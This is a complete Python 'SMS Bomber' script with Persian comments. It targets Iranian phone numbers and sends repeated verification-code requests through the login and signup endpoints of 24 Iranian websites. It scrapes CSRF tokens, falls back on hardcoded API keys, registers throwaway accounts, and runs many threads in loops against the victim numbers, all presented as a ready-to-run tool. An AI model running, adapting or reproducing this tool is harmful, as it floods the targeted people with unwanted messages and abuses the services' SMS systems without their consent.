import requests
from bs4 import BeautifulSoup
import re
from re import match, sub
import time
from time import sleep
from threading import Thread
import random
import json
import uuid
import socket
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from os import system, name
from platform import node, system, release


try:
    from requests import get, post
except ImportError:
    system("python3 -m pip install requests")


user_agents = [
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/109.0 Firefox/109.0", 
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15"
]

# رنگ‌ها برای خروجی
r, g, y, a = '\033[31;1m', '\033[32;1m', '\033[33;1m', '\033[0m'

# ==========================
# بررسی اتصال اینترنت
# ==========================
def check_internet():
    try:
        socket.gethostbyname("smtp.gmail.com")
        return True
    except socket.gaierror:
        return False

# ==========================
# اعتبارسنجی شماره‌ها
# ==========================
def is_phone(phone_input: str):
    phones = phone_input.split('-')
    valid_phones = []
    for phone in phones:
        phone = phone.strip()
        if re.match(r"^(?:\+989|989|09|9)\d{9}$", phone):
            valid_phones.append(re.sub(r"^(?:\+989|989|09|9)", "+989", phone))
        else:
            print(f"{r}[-] Invalid Phone: {phone}{a}")
    return valid_phones if valid_phones else False

# ==========================
# تابع ارسال ایمن
# ==========================
def send_service_safe(service, phone):
    try:
        service(phone)
    except Exception as e:
        print(f"{r}[!] {service.__name__} Exception for {phone}: {e}{a}")

# ==========================
# توابع سرویس‌ها
# ==========================

def digikala(phone):
    try:
        res = post("https://api.digikala.com/v1/user/authenticate/", json={"username": "0" + phone.split("+98")[-1]}, timeout=5)
        print(f'{g}(Digikala) {a}Code Sent' if res.status_code == 200 else f'{r}[-] (Digikala) Failed{a}')
        return res.status_code == 200
    except Exception as e:
        print(f'{r}[!] Digikala Exception: {e}{a}')
        return False

def bimehland(phone):
    phone = phone.replace("+98", "0").replace("98", "0", 1) if phone.startswith(("98", "+98")) else phone
    try:
        r = requests.post("https://bimehland.com/MasterApi/VerifyNumber", 
                          json={"mobile": phone, "nCode": None, "sso": ""}, timeout=10)
        print(f"Status: {r.status_code} | Response: {r.text[:200]}")
        return r.ok
    except Exception as e:
        print(f"Error: {e}")
        return False

def bimeparsian(phone):
    phone = '0' + phone.split('+98')[-1].split('98')[-1]
    try:
        r = requests.post("https://bimeparsian.com/MasterApi/VerifyNumber", json={"mobile": phone, "nCode": None, "sso": ""}, timeout=10)
        print(f"Status: {r.status_code} | Response: {r.text or '[empty]'}")
        return r.status_code in [200, 201]
    except Exception as e:
        print(f"Error: {e}")
        return False

def ebimename(phone):
    phone = '0' + phone.split('+98')[-1].split('98')[-1]
    try:
        r = requests.post("https://ebimename.com/MasterApi/VerifyNumber", json={"mobile": phone, "nCode": None, "sso": ""}, timeout=10)
        print(f"Status: {r.status_code} | {'JSON' if 'json' in r.headers.get('Content-Type', '').lower() else 'TEXT'}: {r.json() if 'json' in r.headers.get('Content-Type', '').lower() else r.text[:300]}")
        return r.status_code in [200, 201]
    except Exception as e:
        print(f"Error: {e}")
        return False

def didar24(phone):
    phone = '0' + phone.split('+98')[-1].split('98')[-1]
    try:
        r = requests.post("https://didar24.com/api/AccessManagement/OAuth/mobile", json={"mobile": phone}, timeout=10)
        print(f"Status: {r.status_code} | Response: {r.text}")
        return r.status_code == 200
    except Exception as e:
        print(f"Error: {e}")
        return False

def ibime(phone):
    phone = '0' + phone.split('+98')[-1].split('98')[-1]
    try:
        r = requests.post("https://api.ibime.com/web/v1/account/otp", json={"phoneNumber": phone}, headers={"Origin": "https://ibime.com", "Referer": "https://ibime.com/"}, timeout=10)
        print(f"STATUS: {r.status_code} | HEADERS: {dict(r.headers)} | TEXT: {r.text}")
        return r
    except Exception as e:
        print(f"Error: {e}")

def bimeh(phone):
    phone = '0' + phone.split('+98')[-1].split('98')[-1]
    try:
        s = requests.Session()
        h = {'User-Agent': 'Mozilla/5.0'}
        token = re.search(r'token["\']\s*[:=]\s*["\']([^"\']+)["\']', s.get("https://bimeh.com/", headers=h, timeout=10, verify=False).text)
        if not token: return False
        r = s.post("https://coreapi.bimeh.com/v1/authentication", json={"MobileNumber": phone}, headers={**h, 'Token': token.group(1), 'Origin': 'https://bimeh.com'}, timeout=10, verify=False)
        print(f"Status: {r.status_code} | Response: {r.text}")
        return r.status_code == 200
    except Exception as e:
        print(f"Error: {e}")
        return False


def darunet(phone):
    phone = '0' + phone.split('+98')[-1].split('98')[-1]
    try:
        s = requests.Session()
        res = s.get("https://darunet.com/my-account/", headers={"User-Agent": "Mozilla/5.0"}, timeout=10, verify=False)
        token = re.search(r'security["\']\s*[:=]\s*["\']([^"\']+)["\']', res.text)
        if not token: return False
        r = s.post("https://darunet.com/wp-admin/admin-ajax.php", 
                   data={"action": "voorodak__submit-username", "username": phone, "security": token.group(1)}, 
                   headers={"User-Agent": "Mozilla/5.0", "X-Requested-With": "XMLHttpRequest", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, 
                   timeout=10, verify=False)
        print(f"[Darunet] {'Success' if r.status_code == 200 and 'success' in r.text.lower() else r.text}")
        return r.status_code == 200 and 'success' in r.text.lower()
    except Exception as e:
        print(f"[Darunet] Error: {e}")
        return False


def padmira(phone):
    phone = '0' + phone.split('+98')[-1].split('98')[-1]
    s = requests.Session()
    h = {"User-Agent": "Mozilla/5.0"}
    try:
        res = s.get("https://padmira.ir/", headers=h, timeout=10)
        token = (BeautifulSoup(res.text, "html.parser").find("meta", {"name": "csrf-token"}) or {}).get("content")
        if not token: return {"error": "Token not found"}
        r = s.post("https://padmira.ir/ajax/send_sms_active", data={"mobile": phone}, headers={**h, "X-CSRF-TOKEN": token, "X-Requested-With": "XMLHttpRequest"}, timeout=10)
        try: return r.json()
        except: return {"response": r.text}
    except Exception as e: return {"error": str(e)}


def bornosmode(phone):
    phone = '0' + phone.split('+98')[-1].split('98')[-1]
    s = requests.Session()
    try:
        res = s.get("https://bornosmode.com/", timeout=10)
        token = BeautifulSoup(res.text, "html.parser").find("meta", {"name": "csrf-token"}).get("content")
        r = s.post("https://bornosmode.com/api/loginRegister/", data={"mobile": phone, "withOtp": "1"}, headers={"X-CSRF-TOKEN": token, "X-Requested-With": "XMLHttpRequest"}, timeout=10)
        return r.json() if r.headers.get('Content-Type', '').startswith('application/json') else r.text
    except Exception as e:
        return f"Error: {e}"


def chapmatin(phone):
    phone = phone.replace('+98', '')
    try:
        s = requests.Session()
        r = s.get("https://www.chapmatin.com/", timeout=10, verify=False)
        token = BeautifulSoup(r.text, "html.parser").find("input", {"name": "dig_nounce"}).get("value")
        data = {'action': 'digits_check_mob', 'countrycode': '+98', 'mobileNo': phone, 'csrf': token, 'login': '2', 'digits': '1', 'json': '1', 'whatsapp': '0', 'digregcode': '+98', 'digits_reg_mail': phone, 'digits_reg_password': 'admin123Mm@0091!', 'dig_nounce': token}
        res = s.post("https://www.chapmatin.com/wp-admin/admin-ajax.php", data=data, headers={'X-Requested-With': 'XMLHttpRequest'}, timeout=10, verify=False)
        out = res.json()
        print(f"Result: {out}")
        return str(out.get("code")) == "1" or out.get("success")
    except Exception as e:
        print(f"Error: {e}")
        return False


def vakiljo(phone):
    phone = '0' + phone.split('+98')[-1].split('98')[-1]
    if not re.match(r"^09\d{9}$", phone): return False
    try:
        payload = {
            "query": "mutation($mobile:String!){challengeUser(mobile:$mobile){status message}}",
            "variables": {"mobile": phone}
        }
        r = requests.post("https://vakiljo.ir/api/graphql", json=payload, headers={"User-Agent": "Mozilla/5.0"}, timeout=10)
        return r.status_code == 200
    except Exception as e:
        print(f"Error: {e}")
        return False

def basalam(phone):
    phone = '0' + phone.split('+98')[-1].split('98')[-1]
    
    url = "https://services.basalam.com/web/v1/auth/captcha/otp-request"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Content-Type": "application/json",
        "X-Client-Info": json.dumps({
            "version": "4.1.54", "project": "charsou", "platform": "web", 
            "name": "web.public", "deviceId": str(uuid.uuid4()), "sessionId": str(uuid.uuid4())
        })
    }
    data = {"mobile": phone, "client_id": "11", "login_by_backup_mobile": False}

    try:
        r = requests.post(url, headers=headers, json=data, timeout=5)
        print(f"[{'✔' if r.status_code == 200 else '✘'}] Basalam: {r.status_code} - {r.text}")
        return r.status_code == 200
    except Exception as e:
        print(f"[!] Error: {e}")
        return False


def azno(phone):
    phone = '0' + phone.split('+98')[-1].split('98')[-1]
    if not re.match(r"^09\d{9}$", phone): return False
    try:
        r = requests.post(f"https://api-main.azno.space/api/Auth/SendOTP?phoneNumber={phone}&method=sms", headers={"Accept": "application/json"}, timeout=10)
        data = r.json() if isinstance(r.json(), dict) else {}
        success = r.status_code == 200 and data.get("success") is True
        print(f"[{'+' if success else '-'}] Azno: {'Success' if success else r.status_code}")
        return success
    except: return False


def azkivam(phone):
    phone = '0' + phone.split('+98')[-1].split('98')[-1]
    if not re.match(r"^09\d{9}$", phone): return False
    try:
        r = requests.post("https://api.azkivam.com/auth/login", json={"mobileNumber": phone, "source": None}, headers={"Origin": "https://azkivam.com", "Referer": "https://azkivam.com/", "x-zrk-cs": "BYPASS"}, timeout=10)
        print(f"[{'+' if r.status_code == 200 else '-'}] Azkivam: {r.status_code}")
        return r.status_code == 200
    except: return False




def arzplus(phone):
    phone = '0' + phone.split('+98')[-1].split('98')[-1]
    if not re.match(r"^09\d{9}$", phone): return False
    try:
        r = requests.post("https://api.arzplus.net/api/v1/accounts/signup/init/", json={"phone": phone}, headers={"Origin": "https://arzplus.net", "Referer": "https://arzplus.net/"}, timeout=10)
        print(f"[{'+' if r.status_code == 200 else '-'}] Arzplus: {r.status_code}")
        return r.status_code == 200
    except: return False


def arzunex(phone):
    phone = '0' + phone.split('+98')[-1].split('98')[-1]
    if not re.match(r"^09\d{9}$", phone): return False
    try:
        r = requests.post("https://arzunex.ir/core/api/v2/public/customer/auth/otp/generate", json={"mobile": phone}, headers={"Content-Type": "application/json"}, timeout=10)
        success = r.status_code in [200, 201]
        print(f"[{'+' if success else '-'}] ArzUnex: {r.status_code}")
        return success
    except: return False


def alopeyk_safir(phone):
    url = "https://api.alopeyk.com/safir-service/api/v1/login"
    payload = {"phone": "0" + phone.split("+98")[1]}
    try:
        response = post(url, json=payload, timeout=5)
        if response.status_code == 200:
            print(f'{g}(Alopeyk Safir) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (Alopeyk Safir) Failed or No Response{a}')
    except Exception as e:
        print(f'{r}[!] Alopeyk Safir Exception: {e}{a}')
        return False


def alldigitall(phone):
    phone = '0' + phone.split('+98')[-1].split('98')[-1]
    try:
        r = requests.post("https://api.alldigitall.ir/v1/auth/register?store_id=0", 
                          json={"firstname": "نام", "lastname": "خانوادگی", "mobile": phone, "password": "12345678", "password_confirmation": "12345678"}, 
                          headers={"Origin": "https://alldigitall.ir", "Referer": "https://alldigitall.ir/"}, timeout=10)
        print(f"[{'+' if r.status_code == 200 else '-'}] AllDigitall: {r.status_code}")
        return r.status_code == 200
    except: return False



def activecleaners(phone):
    phone = '0' + phone.split('+98')[-1].split('98')[-1]
    if not re.match(r"^09\d{9}$", phone): return False
    try:
        r = requests.post("https://uapi.activecleaners.ir/Auth/VerifyUser/GetVerifycode", 
                          json={"mobileOrEmail": phone, "deviceCode": "ActiveClient", "firstName": "", "lastName": "", "password": ""},
                          headers={"Content-Type": "application/json"}, timeout=10, verify=False)
        success = r.status_code == 200 and "true" in r.text.lower()
        print(f"[{'+' if success else '-'}] ActiveCleaners: {r.status_code}")
        return success
    except: return False


def achareh(phone):
    phone = phone.split('+98')[-1].split('98')[-1]
    try:
        r = requests.post("https://api.achareh.co/v2/accounts/login/", json={"phone": "98" + phone}, timeout=5)
        success = r.status_code == 200
        print(f"[{'+' if success else '-'}] Achareh: {r.status_code}")
        return success
    except: return False



def accounts1606(phone):
    phone = '0' + phone.split('+98')[-1].split('98')[-1]
    if not re.match(r"^09\d{9}$", phone): return False
    try:
        r = requests.post(f"https://accounts.1606.ir/otp/create?timestamp={int(time.time() * 1000)}", 
                          json={"phoneOrEmail": phone}, headers={"Origin": "https://accounts.1606.ir", "Referer": "https://accounts.1606.ir/"}, timeout=10)
        success = r.status_code == 200
        print(f"[{'+' if success else '-'}] Accounts1606: {r.status_code}")
        return success
    except: return False


def abantether(phone):
    phone = '0' + phone.split('+98')[-1].split('98')[-1]
    if not re.match(r"^09\d{9}$", phone): return False
    try:
        r = requests.post("https://api.abantether.com/api/v2/auths/register/phone/send", 
                          json={"phone_number": phone}, headers={"Origin": "https://abantether.com", "Referer": "https://abantether.com/", "Accept-Language": "fa"}, timeout=10)
        success = r.status_code == 200
        print(f"[{'+' if success else '-'}] Abantether: {r.status_code}")
        return success
    except: return False



def ubitex(phone):
    phone = '0' + phone.split('+98')[-1].split('98')[-1]
    if not re.match(r"^09\d{9}$", phone): return False
    try:
        s = requests.Session()
        res = s.get("https://ubitex.io/", headers={"User-Agent": "Mozilla/5.0"}, timeout=10)
        key = re.search(r'apiKey["\']?\s*[:=]\s*["\']([^"\']+)["\']', res.text)
        sec = re.search(r'apiSecret["\']?\s*[:=]\s*["\']([^"\']+)["\']', res.text)
        
        payload = {"EmailOrMobile": phone, "Password": "Test123!@#", "phone": phone, "ConfirmPassword": "Test123!@#"}
        headers = {"apiSecret": sec.group(1) if sec else "8d91944f-ee3c-4d44-9826-6275148637ec", 
                   "apiKey": key.group(1) if key else "1b285fe3-935f-43f2-9a12-0eaace9f0607", 
                   "Content-Type": "application/json"}
        
        r = s.post("https://api.ubitex.io/api/member/v2/register", json=payload, headers=headers, timeout=10)
        print(f"[{'+' if r.status_code in [200, 400] else '-'}] Ubitex: {r.status_code}")
        return r.status_code in [200, 400]
    except: return False

# ==========================
# لیست سرویس‌ها
# ==========================
services = [
    accounts1606, achareh, activecleaners, alldigitall, alopeyk_safir,
    arzplus, arzunex, azkivam, azno, basalam,
    bimeh, bimehland, bimeparsian, bornosmode, chapmatin,
    darunet, didar24, digikala, ebimename, ibime,
    padmira, vakiljo, abantether, ubitex
]


# ==========================
# تابع VIP مولتی‌تردینگ
# ==========================
def vip(phones, loops, delay):
    print(f"{g}Targets: {y}{', '.join(phones)}{a}")
    print(f"{g}Services Loaded: {y}{len(services)}{a}")
    print(f"{g}Delay: {y}{delay}s{a}")
    try:
        for _ in range(loops):
            for phone in phones:
                for service in services:
                    Thread(target=send_service_safe, args=(service, phone)).start()
                    sleep(delay)
    except KeyboardInterrupt:
        print(f"{g}[+] Mission Completed!{a}")

# ==========================
# منوی اصلی
# ==========================
def main_menu():
    print(f"""
{y}╔════════════════════════════════════════════╗
{g}║         SMS Bomber by M.M.]R               ║
{y}╚════════════════════════════════════════════╝
{g} Coded by: {r}M.M.]R{a}
{y}══════════════════════════════════════════════
{g} Services Loaded: {y}{len(services)}{a}
{g} Enter phone numbers (separated by - for multiple):
{a} Example: +989123456789-+989987654321
{y}══════════════════════════════════════════════
""")

# ==========================
# نقطه ورود
# ==========================
if __name__ == "__main__":
    if not check_internet():
        print(f"{r}[-] No internet connection!{a}")
    else:
        main_menu()
        phones = None
        while not phones:
            phone_input = input(f'{g}[?] Enter Phone(s) (+98): {a}')
            phones = is_phone(phone_input)
            if not phones:
                print(f"{r}[-] No valid phones entered!{a}")
        
        # بخش اصلاح شده برای پرسیدن تعداد و سرعت
        loops = int(input(f'{g}[?] Loops [Default=1]: {a}') or 1)
        delay = float(input(f'{g}[?] Delay (seconds) [Default=0.1]: {a}') or 0.1)
        
        vip(phones, loops, delay)
